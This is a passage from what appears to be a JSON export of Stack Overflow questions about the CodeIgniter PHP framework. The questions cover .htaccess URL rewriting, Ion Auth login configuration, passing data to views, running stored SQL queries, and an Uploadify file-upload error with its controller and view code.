result:</p>\n\n<pre><code>Array ( ) \nGET\nbool(false) \n</code></pre>\n\n<p>Also, the code works perfect on my local machine but does not work on when uploaded to Bluehost server.</p>\n\n<p>Here is my htaccess file (because I've done enough research to know this may be of value).</p>\n\n<pre><code>RewriteEngine On\nRewriteCond $1 !^(index\\.php|public|assets|images|robots\\.txt)\nRewriteRule ^(.*)$ index.php?/$1 [L] \n</code></pre>\n\n<p>Bluehost service people are saying it is because of a redirect issue and they consider the matter closed but as I am not doing a redirect that leaves either the CodeIgniter framework or their server.</p>\n"},{"tags":["php","codeigniter","deprecated"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":31,"score":0,"question_id":13234574,"title":"Set magic quotes PHP error with legacy codeigniter site","body":"<p>One of our legacy codeigniter sites has recently encountered the following problem - can anyone suggest the best way to fix this?</p>\n\n<pre><code>&lt;h4&gt;A PHP Error was encountered&lt;/h4&gt;\n&lt;p&gt;Severity: 8192&lt;/p&gt;\n&lt;p&gt;Message:  Function set_magic_quotes_runtime() is deprecated&lt;/p&gt;\n&lt;p&gt;Filename: codeigniter/CodeIgniter.php&lt;/p&gt;\n&lt;p&gt;Line Number: 60&lt;/p&gt;\n</code></pre>\n"},{"tags":["php",".htaccess","codeigniter","subdomain"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":54,"score":0,"question_id":13227773,"title":"codeigniter www subdomain issue","body":"<p>I have strange issue with codeigniter and www subdomain.</p>\n\n<p>When i load <a href=\"http://foobar.com\" rel=\"nofollow\">http://foobar.com</a> the page opens normally but when i load <a href=\"http://www.foobar.com\" rel=\"nofollow\">http://www.foobar.com</a> I get CodeIgniter's 404 message</p>\n\n<p>Here is the content of .htaccess file</p>\n\n<pre><code>RewriteEngine on\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteCond %{REQUEST_FILENAME} !-d\nRewriteRule ^(.*)$ index.php/$1 [L]\n</code></pre>\n\n<p>What could be the problem ?</p>\n"},{"tags":["php","codeigniter","authentication","ion"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":748,"score":0,"question_id":5353339,"title":"Unable to change Identity to 'username' in Codeigniter Ion Auth?","body":"<p>I have installed ion auth and everything is up and functional. The only problem I have is I want to change the login to use the visitors username instead of e-mail. I change the CONFIG option in the ion_auth.php config file and it still doesnt work. Is there an extra step Im missing??</p>\n\n<p>ion_auth config</p>\n\n<pre><code>/**\n * A database column which is used to\n * login with.\n **/\n$config['identity']            = 'username';\n</code></pre>\n\n<p>login() in the controller </p>\n\n<pre><code>//log the user in\nfunction login()\n{\n    $this-&gt;data['title'] = \"Login\";\n\n    //validate form input\n    $this-&gt;form_validation-&gt;set_rules('email', 'E-mail Address', 'required|valid_email');\n    $this-&gt;form_validation-&gt;set_rules('password', 'Password', 'required');\n\n    if ($this-&gt;form_validation-&gt;run() == true)\n    { //check to see if the user is logging in\n        //check for \"remember me\"\n        $remember = (bool) $this-&gt;input-&gt;post('remember');\n\n        if ($this-&gt;ion_auth-&gt;login($this-&gt;input-&gt;post('email'), $this-&gt;input-&gt;post('password'), $remember))\n        { //if the login is successful\n            //redirect them back to the home page\n            $this-&gt;session-&gt;set_flashdata('message', $this-&gt;ion_auth-&gt;messages());\n            redirect($this-&gt;config-&gt;item('base_url'), 'refresh');\n        }\n        else\n        { //if the login was un-successful\n            //redirect them back to the login page\n            $this-&gt;session-&gt;set_flashdata('message', $this-&gt;ion_auth-&gt;errors());\n            redirect('auth/login', 'refresh'); //use redirects instead of loading views for compatibility with MY_Controller libraries\n        }\n    }\n    else\n    {  //the user is not logging in so display the login page\n        //set the flash data error message if there is one\n        $this-&gt;data['message'] = (validation_errors()) ? validation_errors() : $this-&gt;session-&gt;flashdata('message');\n\n        $this-&gt;data['email'] = array('name' =&gt; 'email',\n            'id' =&gt; 'email',\n            'type' =&gt; 'text',\n            'value' =&gt; $this-&gt;form_validation-&gt;set_value('email'),\n        );\n        $this-&gt;data['password'] = array('name' =&gt; 'password',\n            'id' =&gt; 'password',\n            'type' =&gt; 'password',\n        );\n\n        $this-&gt;load-&gt;view('auth/login', $this-&gt;data);\n    }\n}\n</code></pre>\n\n<p>login() model</p>\n\n<pre><code>public function login($identity, $password, $remember=FALSE)\n{\n    if (empty($identity) || empty($password) || !$this-&gt;identity_check($identity))\n    {\n    return FALSE;\n    }\n\n    $query = $this-&gt;db-&gt;select($this-&gt;identity_column.', id, password, group_id')\n              -&gt;where($this-&gt;identity_column, $identity)\n              -&gt;where('active', 1)\n              -&gt;where($this-&gt;ion_auth-&gt;_extra_where)\n              -&gt;limit(1)\n              -&gt;get($this-&gt;tables['users']);\n\n    $result = $query-&gt;row();\n\n    if ($query-&gt;num_rows() == 1)\n    {\n    $password = $this-&gt;hash_password_db($identity, $password);\n\n    if ($result-&gt;password === $password)\n    {\n        $this-&gt;update_last_login($result-&gt;id);\n\n        $group_row = $this-&gt;db-&gt;select('name')-&gt;where('id', $result-&gt;group_id)-&gt;get($this-&gt;tables['groups'])-&gt;row();\n\n        $session_data = array(\n                $this-&gt;identity_column =&gt; $result-&gt;{$this-&gt;identity_column},\n                'id'                   =&gt; $result-&gt;id, //kept for backwards compatibility\n                'user_id'              =&gt; $result-&gt;id, //everyone likes to overwrite id so we'll use user_id\n                'group_id'             =&gt; $result-&gt;group_id,\n                'group'                =&gt; $group_row-&gt;name\n                 );\n\n        $this-&gt;session-&gt;set_userdata($session_data);\n\n        if ($remember &amp;&amp; $this-&gt;config-&gt;item('remember_users', 'ion_auth'))\n        {\n        $this-&gt;remember_user($result-&gt;id);\n        }\n\n        return TRUE;\n    }\n    }\n\n    return FALSE;\n}\n</code></pre>\n"},{"tags":["php","codeigniter"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":55,"score":1,"question_id":13196569,"title":"Calling result_array() breaks table..?","body":"<p>I'm looking to hit the database once, and return a MySQL resource AND an array. I have the following code in my controller to do that:</p>\n\n<pre><code>$result = $this-&gt;data-&gt;my_method();\n\n$data['result_resource'] = $result;\n$data['result_array']    = $result-&gt;result_array();\n</code></pre>\n\n<p>In my view, I'm calling the following:</p>\n\n<pre><code>$this-&gt;table-&gt;generate($result_resource);\n</code></pre>\n\n<p>When the <code>$data['result_array']</code> line is commented out, the table works as expected (i.e the column headers show) but when the <code>$data['result_array']</code> line is <em>not</em> commented out, both the <code>result_resource</code> AND the <code>result_array</code> turn to arrays. What's happening here, and how I can avoid it?</p>\n\n<p>The $data array is being passed to the view in typical CI fashion:</p>\n\n<p><code>$this-&gt;load-&gt;view('view.php', $data);</code></p>\n\n<p>Running the method twice does solve the problem, but I'd prefer not to do that.</p>\n"},{"tags":["php","mod-rewrite","codeigniter","url-rewriting"],"answer_count":9,"favorite_count":7,"up_vote_count":16,"down_vote_count":0,"view_count":14671,"score":16,"question_id":1445385,"title":"How to remove \"index.php\" in codeigniter's path","body":"<p>How do I remove the <code>\"index.php\"</code> sticking out in every path in codeigniter somewhere in the center?\nI want clean non <code>index.php-fied URLs</code>?</p>\n"},{"tags":["php","mysql","codeigniter"],"answer_count":1,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":80,"score":3,"question_id":13225348,"title":"PHP execute user defined queries","body":"<p>I'm developing a project using CodeIgniter where the pages displayed have an option list with available queries (<code>SELECT</code> statements) for the displayed data on the page.  These queries are stored in a MySQL table and include User Defined queries.  </p>\n\n<p>My questions is, what's the best method of handling execution of the selected query:</p>\n\n<ol>\n<li><p>Obtain SQL Statement from Table (<code>view_id</code> key) using query command.  Replace parameters in returned SQL statement.  Execute SQL statement using query command.</p></li>\n<li><p>When loading the page, store the SQL statements in an array (could be large).  When user changes the selection on the page, grab the statement from the array, replace parameters in statement, run query.</p></li>\n<li><p>Use MySQL prepared statement.  (foresee an issue with the parameters, as all views would need the same parameter sequence)</p></li>\n<li><p>Other options?</p></li>\n</ol>\n\n<p>I'm looking for an efficient as well as secure method.</p>\n\n<p>Thanks </p>\n"},{"tags":["php","codeigniter","yii","responsive-design"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":5,"view_count":107,"score":-5,"question_id":13227679,"title":"Best PHP framework that supports responsive design","body":"<p>I have installed and learned few basic things about CodeIgniter and yii framework. Both are good.\nI also searched for comparision on stack site. I found <a href=\"http://stackoverflow.com/questions/7799012/yii-or-codeigniter-for-a-large-web-application\">Yii or Codeigniter? for a large web application</a></p>\n\n<p>I think this gave a fair knowledge to decide upon choosing a framework. But in my case I'll be using it for a Restaurant Management software. The site will be done with responsive design (most probably with twitter's bootstrap framework). I just wanted to know which one of these 2 frameworks is better/faster with respect to Responsive UI implementation.\nI have to consider this aspect also which is missing in the link I found. This is also an important part of my project.</p>\n"},{"tags":["php","codeigniter","form-validation","config"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":28,"score":0,"question_id":13227536,"title":"CodeIgniter form validation config stops working when an object name is assigned","body":"<p>I was working with CodeIgniter's form validation. I had a config file in </p>\n\n<pre><code>application/config/form_validation.php\n</code></pre>\n\n<p>it works fine in most case, but in one of my files, I had this line</p>\n\n<pre><code>$this-&gt;load-&gt;library('form_validation', '', 'validation');\n</code></pre>\n\n<p>Then the config file stops working.</p>\n\n<p>It seems to me that the config file won't work if I assigned a different object name.</p>\n\n<p>That seem pretty inconvenient to me, is there any way to fix it?</p>\n"},{"tags":["php","codeigniter"],"answer_count":5,"favorite_count":1,"up_vote_count":2,"down_vote_count":1,"view_count":54,"score":1,"question_id":13227169,"title":"How To Echo A Multi Dimensional Array?","body":"<p>i have string data</p>\n\n<pre><code>$data=\"100,200,300,400|500,600,700,800|900,100,200,300|400,500,600,700|800,900,100,200|300,400,500,600|700,800,900,100\";\n</code></pre>\n\n<p>and i want get result like this</p>\n\n<pre><code>a   |b   |c   |d   |\n100 |200 |300 |400 |\n500 |600 |700 |800 |\n900 |100 |200 |300 |\n.   |.   |.   |.   |\netc |etc |etc |etc |\n</code></pre>\n\n<p>what i have to do to get result like that</p>\n\n<p>i new in programming and didnt know about multidimensional array</p>\n\n<p>all i know i explode this string twice</p>\n\n<pre><code>$data = explode(';',$data);\nforeach($data as &amp;$d)\n    $d=explode(':',$d);\n</code></pre>\n"},{"tags":["apache","osx","codeigniter","osx-snow-leopard"],"answer_count":11,"favorite_count":1,"up_vote_count":5,"down_vote_count":0,"view_count":2752,"score":5,"question_id":6809373,"title":"Remove \"index.php\" from URL - Codeigniter","body":"<p>I've looked in the documentation of Codeigniter of removing the <code>index.php</code> from the URL when accessing different views, the code shows how to remove it with apache:</p>\n\n<pre><code>RewriteEngine on\nRewriteCond $1 !^(index\\.php|images|robots\\.txt)\nRewriteRule ^(.*)$ /index.php/$1 [L]\n</code></pre>\n\n<p>However, when I go to <code>http://localhost/code/home</code>, I get this:</p>\n\n<blockquote>\n  <p>The requested URL /code/home was not found on this server.</p>\n</blockquote>\n\n<p>But accessing <code>http://localhost/code/index.php/home</code> works just fine, how come it isn't working for me?</p>\n\n<p>I'm on a Mac OS X Snow Leopard using the <code>Sites</code> directory: <code>/Users/~myusername~/Sites/code</code>, and I'm not using any software, i.e. MAMP, XAMPP.</p>\n\n<p><strong>EDIT</strong></p>\n\n<p>For the <code>sudo /usr/sbin/apachectl -k restart -S</code> command, I get this:</p>\n\n<pre><code>VirtualHost configuration:\nwildcard NameVirtualHosts and _default_ servers:\n*:80                   is a NameVirtualHost\n         default server code.local (/private/etc/apache2/httpd.conf:146)\n         port 80 namevhost code.local (/private/etc/apache2/httpd.conf:146)\nSyntax OK\n</code></pre>\n"},{"tags":["php",".htaccess","codeigniter","pretty-urls"],"answer_count":3,"favorite_count":1,"up_vote_count":0,"down_vote_count":0,"view_count":97,"score":0,"question_id":11927372,"title":"Codeigniter - controllers in subfolder, remove index.php from url","body":"<p>How can I remove 'index.php' from urls, if I have some controllers in the controllers folder and one in subfolder?\nFor example my frontend url looks like this : <strong>domain.com/site/contact.html</strong>\nI would like my backend url look like this: <strong>domain.com/system/settings/profile.html</strong>, where system is not a controller, only a subfolder in the controllers folder.\nWhen I type <strong>domain.com/index.php/system/settings/profile.html</strong>, everything works fine, it just does not look right.\nHere's what's in my routes.php file:</p>\n\n<pre><code>$route['default_controller'] = \"site\";\n$route['system'] = \"system/login\";\n$route['404_override'] = 'errors/error_404';\n</code></pre>\n\n<p>Here's what's in my .htaccess file:</p>\n\n<pre><code>RewriteEngine on\nRewriteCond $1    !^(index\\.php|img|css|public|tmp|download|javascript|rte|document|xajax_js|robots\\.txt)\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteCond %{REQUEST_FILENAME} !-d\nRewriteRule ^(.*)$ index.php/$1 [L,QSA]\n</code></pre>\n\n<p>Thanks.</p>\n"},{"tags":["arrays","codeigniter"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":25,"score":2,"question_id":13171832,"title":"Using numeric indixes to pass data from controller to view","body":"<p>I have a simple question. Let me explain<br>\nWe use this to pass data from controller to view</p>\n\n<pre><code>function index(){\n\n    $data['title'] = 'This is title';\n    $data['message'] = 'This is message';\n    $this-&gt;load-&gt;view('test',$data);\n}\n</code></pre>\n\n<p>Here we are using Associative Array to pass data<br>\nAnd now this function again and use indexed array instead of Associative Array</p>\n\n<pre><code>function index(){\n\n    $data[] = 'This is title';\n    $data[] = 'This is message';\n    $this-&gt;load-&gt;view('test',$data);\n}   \n</code></pre>\n\n<p>And now in View this does not work.</p>\n\n<pre><code>echo $data[0];\necho '&lt;br&gt;';\necho $data[1];\n</code></pre>\n\n<p>i only want to know if why this does not work. And in the user guide i never read that associative array is necessary.</p>\n"},{"tags":["ajax","codeigniter","jquery-ajax","uploadify"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":58,"score":1,"question_id":13139509,"title":"why i get HTTP Error when try to upload with uploadify","body":"<p>i chosse gallerycms to build my own gallery but when i try to make it as module into my codeigniter cms i get this error  HTTP Error i dont know why i see this error although i was copy all controllers ,models,views,core files ,,and i still see this error </p>\n\n<p>NOTICE: uploadify work good with Gallerycms bu when i want to add it into my cms as module i see this error</p>\n\n<p><img src=\"http://i.stack.imgur.com/b1rMN.png\" alt=\"error capture\"></p>\n\n<p><img src=\"http://i.stack.imgur.com/dlIRk.png\" alt=\"error from chrome console\">\nfirebug code</p>\n\n<pre><code>&lt;script type=\"text/javascript\"&gt;\n$(document).ready(function() {\n$('.btn-group &gt; a').tooltip();\n$('#upload-btn').hide();\n$('#new-images').hide();\n$('a.img-fancy').fancybox();\n$('.image-delete-btn').click(function() {\ndeleteUrl = $(this).attr('action');\n});\n$('#image-modal').on('show', function() {\n$('#image-modal-delete-btn').attr('href', deleteUrl);\n});\n$(\"#sortable\").sortable({\nhandle : '.drag-handle',\nupdate : function () {\nvar order = $('#sortable').sortable('serialize', { key : 'order_num[]' });\n$.ajax({\nurl : 'http://localhost/gallery/album/reorder?' + order,\ntype : 'GET',\ncache : false,\nsuccess : function(response) {\n$('#reorder-feedback').show();\n$('#reorder-feedback').html('&lt;a class=\"close\" data-dismiss=\"alert\"&gt;x&lt;/a&gt;&lt;strong&gt;Changed image order successfully.&lt;/strong&gt;');\n},\nerror : function(jqXHR, textStatus, errorThrown) {\nalert('An error occured when ordering the images.');\n}\n});\n}\n});\n$( \"#sortable\" ).disableSelection();\n$('#file_upload').uploadify({\n'uploader' : 'http://localhost/gallery/webroot/flash/uploadify.swf',\n'script' : 'http://localhost/gallery/api/upload/3',\n'cancelImg' : 'http://localhost/gallery/webroot/images/cancel.png',\n'folder' : '/webroot/uploads',\n'auto' : false,\n'multi' : true,\n'fileExt' : '*.jpg;*.jpeg;*.gif;*.png',\n'fileDesc' : 'Image files',\n'sizeLimit' : 2097152, // 2MB\n'wmode' : 'opaque',\n'onSelect' : function(event, ID, fileObj) {\n$('#upload-btn').show();\n},\n'onCancel' : function(event, ID, fileObj) {\n$('#upload-btn').hide();\n},\n'onError' : function(event, ID, fileObj, errorObj) {\n},\n'onComplete' : function(event, ID, fileObj, response, data) {\nvar fileName = response;\n$('#upload-btn').hide();\n$('#new-images').show();\n$.ajax({\nurl : 'http://localhost/gallery/album/resize/3/' + response,\ntype : 'POST',\ncache : false,\nsuccess : function(response) {\nif (response !== 'failure') {\nvar new_image = '&lt;li&gt;&lt;img src=\"http://localhost/gallery/webroot/uploads/' + response + '\" /&gt;&lt;br /&gt;' + response + '&lt;/li&gt;';\n$('#new-image-list').append(new_image);\n} else {\nvar fail_message = '&lt;li&gt;Thumbnail creation failed for: ' + fileObj.name + '&lt;/li&gt;';\n$('#new-image-list').append(fail_message);\n}\n},\nerror : function(jqXHR, textStatus, errorThrown) {\nalert('Error occurred when generating thumbnails.');\n}\n});\n}\n});\n});\n&lt;/script&gt; \n</code></pre>\n\n<p>api controller</p>\n\n<p>/**\n   * Handles image uploads.\n   *\n   * @param type $album_id \n   */</p>\n\n<pre><code>  public function upload($album_id)\n  {\n    $config = array();\n    $config['upload_path']    = './webroot/uploads/';\n    $config['allowed_types']  = 'gif|jpg|png';\n    $config['max_size']       = '2048'; // 2MB\n    $config['remove_spaces']  = TRUE;\n    $config['encrypt_name']   = TRUE;\n    $config['overwrite']      = FALSE;\n    $this-&gt;load-&gt;library('upload', $config);\n    if ( ! $this-&gt;upload-&gt;do_upload('Filedata'))\n    {\n      header('HTTP/1.1 500 Internal Server Error');\n      exit();\n    }\n    else\n    {\n      $upload_info = $this-&gt;upload-&gt;data();\n\n      $album_config = $this-&gt;config_model-&gt;get_by_album_id($album_id);\n\n      // Insert file information into database\n      $now = date('Y-m-d H:i:s');\n      $order_num = $this-&gt;image_model-&gt;get_last_order_num($album_id);\n      if (empty($order_num))\n      {\n        $order_num = 0;\n      }\n      $order_num++;\n      $image_data = array(\n      'album_id'       =&gt; $album_id,\n      'uuid'           =&gt; $this-&gt;create_uuid(),\n      'name'           =&gt; $upload_info['file_name'],\n      'order_num'      =&gt; $order_num,\n      'caption'        =&gt; '',\n      'raw_name'       =&gt; $upload_info['raw_name'],\n      'file_type'      =&gt; $upload_info['file_type'],\n      'file_name'      =&gt; $upload_info['file_name'],\n      'file_ext'       =&gt; $upload_info['file_ext'],\n      'file_size'      =&gt; $upload_info['file_size'],\n      'path'           =&gt; $config['upload_path'],\n      'full_path'      =&gt; $upload_info['full_path'],\n      'published'      =&gt; $album_config-&gt;auto_publish,\n      'created_at'     =&gt; $now,\n      'updated_at'     =&gt; $now,\n      );\n\n      $image_id = $this-&gt;image_model-&gt;create($image_data);\n\n\n      $this-&gt;album_model-&gt;update(array('updated_at' =&gt; $now), $album_id);\n\n      echo $image_id;\n    }\n  }\n\n\n\n\n}\n</code></pre>\n\n<p>views/images.php</p>\n\n<pre><code>&lt;?php\n$includes = array(\n    'js' =&gt; array('jquery-ui-1.8.18.custom.min.js', 'swfobject.js', 'jquery.uploadify.v2.1.4.min.js', 'fancybox/jquery.fancybox-1.3.4.pack.js'), \n    'css' =&gt; array('uploadify.css', 'fancybox/jquery.fancybox-1.3.4.css'));\n?&gt;\n&lt;?php $this-&gt;load-&gt;view('album/inc/header', $includes); ?&gt;\n\n&lt;?php if (isset($flash)): ?&gt;\n&lt;div class=\"alert alert-success\"&gt;&lt;a class=\"close\" data-dismiss=\"alert\"&gt;x&lt;/a&gt;&lt;strong&gt;&lt;?php echo $flash; ?&gt;&lt;/strong&gt;&lt;/div&gt;\n&lt;?php endif; ?&gt;\n\n&lt;div class=\"w100\" style=\"margin-bottom: 10px;\"&gt;\n\n  &lt;ul class=\"pager\"&gt;\n    &lt;li class=\"previous\"&gt;\n        &lt;a href=\"&lt;?php echo base_url('album'); ?&gt;\"&gt;&amp;larr; Back to albums&lt;/a&gt;\n    &lt;/li&gt;\n  &lt;/ul&gt;\n  &lt;div class=\"well\"&gt;\n    &lt;h4 style=\"margin-bottom: 10px;\"&gt;Upload images for album: &lt;?php echo $album-&gt;name; ?&gt;&lt;/h4&gt;\n    &lt;input id=\"file_upload\" type=\"file\" name=\"file_upload\" /&gt;\n    &lt;p id=\"upload-btn\" style=\"margin:10px 0;\"&gt;\n      &lt;a href=\"javascript:$('#file_upload').uploadifyUpload()\" class=\"btn btn-primary btn-large\"&gt;Upload Files&lt;/a&gt;\n    &lt;/p&gt;\n    &lt;div id=\"new-images\"&gt;\n      &lt;h4&gt;Uploaded Images&lt;/h4&gt;\n      &lt;p&gt;&lt;a class=\"btn\" href=\"&lt;?php echo site_url(\"album/images/$album-&gt;id\"); ?&gt;\" style=\"margin: 10px 0;\"&gt;&lt;i class=\"icon-refresh\"&gt;&lt;/i&gt; Refresh&lt;/a&gt;&lt;/p&gt;\n      &lt;ul id=\"new-image-list\"&gt;&lt;/ul&gt;\n      &lt;div class=\"clear\"&gt;&lt;/div&gt;\n    &lt;/div&gt;\n  &lt;/div&gt;\n&lt;/div&gt;\n\n&lt;div id=\"reorder-feedback\" class=\"alert alert-success\" style=\"display: none;\"&gt;&lt;/div&gt;\n\n&lt;span class=\"left w75\"&gt;\n  &lt;?php \n  $total_file_size = 0;\n  $total_images = 0;\n  $img_url = '';\n  ?&gt;\n  &lt;?php if (isset($images)): ?&gt;\n  &lt;ul id=\"sortable\"&gt;\n    &lt;?php foreach ($images as $image): ?&gt;\n    &lt;?php \n    $total_file_size += $image-&gt;file_size; \n    $total_images++;\n    $img_url = base_url() . 'webroot/uploads/' . $image-&gt;file_name;\n    ?&gt;\n    &lt;li id=\"image_&lt;?php echo $image-&gt;id; ?&gt;\" class=\"ui-state-default\" style=\"height: &lt;?php echo $config-&gt;thumb_height + 10; ?&gt;px\"&gt;\n      &lt;div class=\"drag-handle\" style=\"height: &lt;?php echo $config-&gt;thumb_height + 5; ?&gt;px\"&gt;&lt;/div&gt;\n      &lt;div class=\"image-container\"&gt;\n        &lt;a class=\"album-images img-fancy thumbnail\" href=\"&lt;?php echo $img_url; ?&gt;\" title=\"&lt;?php echo $image-&gt;caption; ?&gt;\"&gt;\n          &lt;img src=\"&lt;?php echo base_url() . 'webroot/uploads/' . $image-&gt;raw_name . '_thumb' . $image-&gt;file_ext . '?r=' . rand(); ?&gt;\" alt=\"&lt;?php echo $image-&gt;caption; ?&gt;\" /&gt;\n        &lt;/a&gt;\n      &lt;/div&gt;\n      &lt;div class=\"info\" style=\"left: &lt;?php echo $config-&gt;thumb_width + 50; ?&gt;px\"&gt;\n        File name: &lt;?php echo $image-&gt;name; ?&gt;&lt;br /&gt;\n        Caption: \n          &lt;?php if (empty($image-&gt;caption)): ?&gt;\n            &lt;a href=\"&lt;?php echo site_url(\"image/edit/$album-&gt;id/$image-&gt;id\"); ?&gt;\"&gt;Create one&lt;/a&gt;\n          &lt;?php else: ?&gt;\n            &lt;?php echo $image-&gt;caption; ?&gt; \n          &lt;?php endif; ?&gt;\n          &lt;br /&gt;\n        &lt;?php /* Comments: &lt;?php echo $image-&gt;comments; ?&gt;&lt;br /&gt; */ ?&gt;\n        File size: &lt;?php echo $image-&gt;file_size; ?&gt; KB&lt;br /&gt;\n      &lt;/div&gt;\n      &lt;div class=\"btn-group\"&gt;\n        &lt;a href=\"&lt;?php echo $img_url; ?&gt;\" class=\"btn img-fancy\" rel=\"tooltip\" data-original-title=\"Preview\"&gt;&lt;i class=\"icon-zoom-in\"&gt;&lt;/i&gt;&lt;/a&gt;\n        &lt;a href=\"&lt;?php echo site_url(\"image/download/$image-&gt;id\"); ?&gt;\" class=\"btn\" title=\"Download\" rel=\"tooltip\" data-original-title=\"Download\"&gt;&lt;i class=\"icon-download-alt\"&gt;&lt;/i&gt;&lt;/a&gt;\n        &lt;a href=\"&lt;?php echo site_url(\"image/edit/$album-&gt;id/$image-&gt;id\"); ?&gt;\" class=\"btn\" title=\"Edit\" rel=\"tooltip\" data-original-title=\"Edit\"&gt;&lt;i class=\"icon-pencil\"&gt;&lt;/i&gt;&lt;/a&gt;\n        &lt;?php /* &lt;a href=\"&lt;?php echo site_url(\"image/comments/$album-&gt;id/$image-&gt;id\"); ?&gt;\" class=\"btn\" title=\"Comments\" rel=\"tooltip\" data-original-title=\"Comments\"&gt;&lt;i class=\"icon-comment\"&gt;&lt;/i&gt;&lt;/a&gt; */ ?&gt;\n        &lt;?php if ($image-&gt;published == 1): ?&gt;\n        &lt;a href=\"&lt;?php echo site_url(\"image/unpublish/$album-&gt;id/$image-&gt;id\"); ?&gt;\" class=\"btn btn-success\" title=\"Published\" rel=\"tooltip\" data-original-title=\"Published\"&gt;&lt;i class=\"icon-ok icon-white\"&gt;&lt;/i&gt;&lt;/a&gt;\n        &lt;?php else: ?&gt;\n        &lt;a href=\"&lt;?php echo site_url(\"image/publish/$album-&gt;id/$image-&gt;id\"); ?&gt;\" class=\"btn\" title=\"Unpublished\" rel=\"tooltip\" data-original-title=\"Unpublished\"&gt;&lt;i class=\"icon-ok\"&gt;&lt;/i&gt;&lt;/a&gt;\n        &lt;?php endif; ?&gt;\n        &lt;a href=\"#image-modal\" class=\"btn btn-danger image-delete-btn\" title=\"Delete\" rel=\"tooltip\" action=\"&lt;?php echo site_url(\"image/remove/$album-&gt;id/$image-&gt;id\"); ?&gt;\" data-toggle=\"modal\" data-original-title=\"Delete\"&gt;&lt;i class=\"icon-remove icon-white\"&gt;&lt;/i&gt;&lt;/a&gt;\n      &lt;/div&gt;\n    &lt;/li&gt;\n    &lt;?php endforeach; ?&gt;\n  &lt;/ul&gt;\n  &lt;?php endif; ?&gt;\n&lt;/span&gt;\n&lt;span class=\"right w20\"&gt;\n  &lt;div class=\"well sidebar-nav\"&gt;\n    &lt;ul class=\"nav nav-list\"&gt;\n      &lt;li class=\"nav-header\"&gt;&lt;?php echo $album-&gt;name; ?&gt;&lt;/li&gt;\n      &lt;li&gt;&lt;a href=\"&lt;?php echo site_url(\"album/edit/$album-&gt;id\"); ?&gt;\"&gt;&lt;i class=\"icon-pencil\"&gt;&lt;/i&gt;Rename&lt;/a&gt;&lt;/li&gt;\n      &lt;li&gt;&lt;a href=\"&lt;?php echo site_url(\"album/configure/$album-&gt;id\"); ?&gt;\"&gt;&lt;i class=\"icon-cog\"&gt;&lt;/i&gt;Configure&lt;/a&gt;&lt;/li&gt;\n      &lt;li class=\"nav-header\"&gt;Info&lt;/li&gt;\n      &lt;li&gt;Images: &lt;?php echo $total_images; ?&gt;&lt;/li&gt;\n      &lt;li&gt;Album file size: &lt;?php echo round($total_file_size / 1024, 2); ?&gt; MB&lt;/li&gt;\n    &lt;/ul&gt;\n  &lt;/div&gt;\n&lt;/span&gt;\n&lt;div class=\"clear\"&gt;&lt;/div&gt;\n\n&lt;div class=\"modal hide fade\" id=\"image-modal\"&gt;\n  &lt;div class=\"modal-header\"&gt;\n    &lt;a class=\"close\" data-dismiss=\"modal\"&gt;×&lt;/a&gt;\n    &lt;h3&gt;Delete Image&lt;/h3&gt;\n  &lt;/div&gt;\n  &lt;div class=\"modal-body\"&gt;\n    &lt;p&gt;&lt;strong&gt;Are you sure you want to delete this image?&lt;/strong&gt;&lt;/p&gt;\n  &lt;/div&gt;\n  &lt;div class=\"modal-footer\"&gt;\n    &lt;a id=\"image-modal-delete-btn\" href=\"#\" class=\"btn btn-danger\"&gt;Delete&lt;/a&gt;\n    &lt;a href=\"#\" class=\"btn\" data-dismiss=\"modal\"&gt;Cancel&lt;/a&gt;\n  &lt;/div&gt;\n&lt;/div&gt;\n\n&lt;script type=\"text/javascript\"&gt;\n$(document).ready(function() {\n  $('.btn-group &gt; a').tooltip();\n  $('#upload-btn').hide();\n  $('#new-images').hide();\n\n  $('a.img-fancy').fancybox();\n\n  $('.image-delete-btn').click(function() {\n    deleteUrl = $(this).attr('action');\n  });\n\n  $('#image-modal').on('show', function() {\n    $('#image-modal-delete-btn').attr('href', deleteUrl);\n  });\n\n  $(\"#sortable\").sortable({\n    handle : '.drag-handle',\n    update : function () { \n      var order = $('#sortable').sortable('serialize', { key : 'order_num[]' }); \n      $.ajax({\n        url          : '&lt;?php echo base_url(); ?&gt;album/reorder?' + order,\n        type         : 'GET',\n        cache        : false,\n        success      : function(response) {\n          $('#reorder-feedback').show();\n          $('#reorder-feedback').html('&lt;a class=\"close\" data-dismiss=\"alert\"&gt;x&lt;/a&gt;&lt;strong&gt;Changed image order successfully.&lt;/strong&gt;');\n        },\n        error        : function(jqXHR, textStatus, errorThrown) {\n          alert('An error occured when ordering the images.');\n        }\n      });\n    }\n  });\n\n  $( \"#sortable\" ).disableSelection();\n\n\n  $('#file_upload').uploadify({\n    'uploader'       : '&lt;?php echo base_url(); ?&gt;webroot/flash/uploadify.swf',\n    'script'         : '&lt;?php echo base_url(); ?&gt;album/api/upload/&lt;?php echo $album-&gt;id;  ?&gt;',\n    'cancelImg'      : '&lt;?php echo base_url(); ?&gt;webroot/images/cancel.png',\n    'folder'         : '/webroot/uploads',\n    'auto'           : false,\n    'multi'          : true,\n    'fileExt'        : '*.jpg;*.jpeg;*.gif;*.png',\n    'fileDesc'       : 'Image files',\n    'sizeLimit'      : 2097152, // 2MB\n    'wmode'          : 'opaque',\n    'onSelect'       : function(event, ID, fileObj) {\n      $('#upload-btn').show();\n    },\n    'onCancel'       : function(event, ID, fileObj) {\n      $('#upload-btn').hide();\n    },\n    'onError'        : function(event, ID, fileObj, errorObj) {\n\n    },\n    'onComplete'     : function(event, ID, fileObj, response, data) {\n      var fileName = response;\n      $('#upload-btn').hide();\n      $('#new-images').show();\n      $.ajax({\n        url          : '&lt;?php echo base_url(); ?&gt;album/resize/&lt;?php echo $album-&gt;id; ?&gt;/' + response,\n        type         : 'POST',\n        cache        : false,\n        success      : function(response) {\n          if (response !== 'failure') {\n            var new_image = 